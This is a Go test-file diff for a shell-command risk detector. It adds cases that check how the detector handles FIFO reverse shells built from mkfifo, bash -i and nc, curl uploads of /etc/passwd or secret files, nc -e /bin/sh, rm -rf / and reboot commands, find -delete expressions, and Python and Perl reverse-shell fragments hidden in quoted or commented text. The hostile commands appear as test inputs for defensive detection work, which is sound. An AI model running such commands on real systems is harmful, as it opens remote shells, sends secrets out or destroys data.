@@ -229,6 +229,11 @@ func TestSessionDetectsFIFOReverseShellWithoutTrace(t *testing.T) {
 	}
 
 	safe := []string{
+		`mkfifo /tmp/f; cat /tmp/f | bash -i | nc host 18889 > /tmp/f > /tmp/unrelated`,
+		`mkfifo /tmp/f; cat /tmp/f | bash -i | nc -h > /tmp/f`,
+		`mkfifo /tmp/f; cat /tmp/f | bash -i | nc -z host 18889 > /tmp/f`,
+		`mkfifo /tmp/f; cat /tmp/f | bash -i | nc -l 18889 > /tmp/f`,
+		`mkfifo /tmp/f; cat /tmp/f | bash -i | nc host 18889 > /tmp/f >&2`,
 		"mkfifo /tmp/f\ncat /tmp/f\nbash -i <<< \"$UNRESOLVED\"\nnc host 18889 <<< \"$UNRESOLVED\" > /tmp/f",
 		"mkfifo /tmp/f\ncat /tmp/f\nbash -i\nnc host 18889 > /tmp/f",
 		`mkfifo /tmp/f; cat /tmp/f | bash -i </tmp/input | nc host 18889 > /tmp/f`,
@@ -238,6 +243,105 @@ func TestSessionDetectsFIFOReverseShellWithoutTrace(t *testing.T) {
 	for _, source := range safe {
 		if err := simulateWithSession(source); err != nil {
 			t.Fatalf("safe source %q returned %v, want no detection", source, err)
+		}
+	}
+}
+
+func TestDetectorOptionAndLiteralPrecision(t *testing.T) {
+	for _, test := range []*struct {
+		name    string
+		command libcommand.Command
+		source  string
+		risk    bool
+	}{
+		{"curl", analysis.Curl, `curl -H '-T/etc/passwd' https://example.invalid`, false},
+		{"curl", analysis.Curl, `curl --header '--data=@secret' https://example.invalid`, false},
+		{"curl", analysis.Curl, `curl --data-raw '-Tsecret' https://example.invalid`, false},
+		{"curl", analysis.Curl, `curl -H header -sTsecret https://example.invalid`, true},
+		{"curl", analysis.Curl, `curl --help --upload-file secret`, false},
+		{"curl", analysis.Curl, `curl -- --upload-file secret`, false},
+		{"nc", analysis.NC, `nc -h -e /bin/sh host 4444`, false},
+		{"nc", analysis.NC, `nc -e /bin/sh -h`, false},
+		{"nc", analysis.NC, `nc -e /bin/sh -- -h 4444`, true},
+		{"reboot", analysis.Reboot, `reboot --help`, false},
+		{"halt", analysis.Halt, `halt --help`, false},
+		{"poweroff", analysis.Poweroff, `poweroff --version`, false},
+		{"shutdown", analysis.Shutdown, `shutdown --help`, false},
+		{"systemctl", analysis.Systemctl, `systemctl --no-block reboot`, true},
+		{"systemctl", analysis.Systemctl, `systemctl --host reboot status`, false},
+		{"systemctl", analysis.Systemctl, `systemctl --host example --no-block poweroff`, true},
+		{"systemctl", analysis.Systemctl, `systemctl reboot --help`, false},
+		{"rm", analysis.RM, `rm -rf '/*'`, false},
+		{"rm", analysis.RM, `set -f; rm -rf /*`, false},
+		{"rm", analysis.RM, `rm -rf /`, true},
+	} {
+		t.Run(test.source, func(t *testing.T) {
+			err := simulate(t, test.source, map[string]libcommand.Command{test.name: test.command})
+			if errors.Is(err, analysis.ErrRiskDetected) != test.risk || err != nil && !errors.Is(err, analysis.ErrRiskDetected) {
+				t.Fatalf("error=%v, want risk=%v", err, test.risk)
+			}
+		})
+	}
+}
+
+func TestFindOnlyReportsReachableDeletion(t *testing.T) {
+	for _, test := range []*struct {
+		expression string
+		risk       bool
+	}{
+		{`-false -a -delete`, false},
+		{`-false -delete`, false},
+		{`-true -o -delete`, false},
+		{`! -true -delete`, false},
+		{`\( -true -o -false \) -o -delete`, false},
+		{`-name -delete`, false},
+		{`-printf -delete`, false},
+		{`-printf '%p' -o -delete`, false},
+		{`-fprintf out '%p' -o -delete`, false},
+		{`-prune -o -delete`, false},
+		{`-printf '%p' -a -delete`, true},
+		{`-exec echo {} + -o -delete`, false},
+		{`-execdir echo {} + -a -delete`, true},
+		{`-maxdepth 0 -o -delete`, false},
+		{`-exec echo -delete \;`, false},
+		{`-quit -delete`, false},
+		{`-false -o -delete`, true},
+		{`-false , -delete`, true},
+		{`\( -false -o -true \) -a -delete`, true},
+		{`-name '*.tmp' -delete`, true},
+		{`-delete -false`, true},
+	} {
+		t.Run(test.expression, func(t *testing.T) {
+			err := simulate(t, `find / `+test.expression, map[string]libcommand.Command{"find": analysis.Find})
+			if errors.Is(err, analysis.ErrRiskDetected) != test.risk || err != nil && !errors.Is(err, analysis.ErrRiskDetected) {
+				t.Fatalf("error=%v, want risk=%v", err, test.risk)
+			}
+		})
+	}
+}
+
+func TestPythonDoesNotExecuteQuotedOrCommentedText(t *testing.T) {
+	for _, source := range []string{
+		`python3 -c 'print("socket.socket(); s.connect(x); os.dup2(a,b); pty.spawn(/bin/sh)")'`,
+		`python3 -c 'text="""socket.socket(); s.connect(x); os.dup2(a,b); pty.spawn(/bin/sh)"""; print(text)'`,
+		"python3 -c '# socket.socket(); s.connect(x); os.dup2(a,b); pty.spawn(\"/bin/sh\")\nprint(1)'",
+		`python3 -c 's=socket.socket();s.connect(x);os.dup2(a,b);print("pty.spawn(\"/bin/sh\")")'`,
+	} {
+		t.Run(source, func(t *testing.T) {
+			if err := simulate(t, source, map[string]libcommand.Command{"python3": analysis.Python}); err != nil {
+				t.Fatal(err)
+			}
+		})
+	}
+}
+
+func TestPerlDoesNotExecuteQuotedOrCommentedText(t *testing.T) {
+	for _, source := range []string{
+		`perl -e 'print "use Socket; socket(S); connect(S); open(STDIN,x); open(STDOUT,x); open(STDERR,x); exec(/bin/sh)"'`,
+		"perl -e '# use Socket; socket(S); connect(S); open(STDIN,x); open(STDOUT,x); open(STDERR,x); exec(/bin/sh)\nprint 1'",
+	} {
+		if err := simulate(t, source, map[string]libcommand.Command{"perl": analysis.Perl}); err != nil {
+			t.Fatal(err)
 		}
 	}
 }
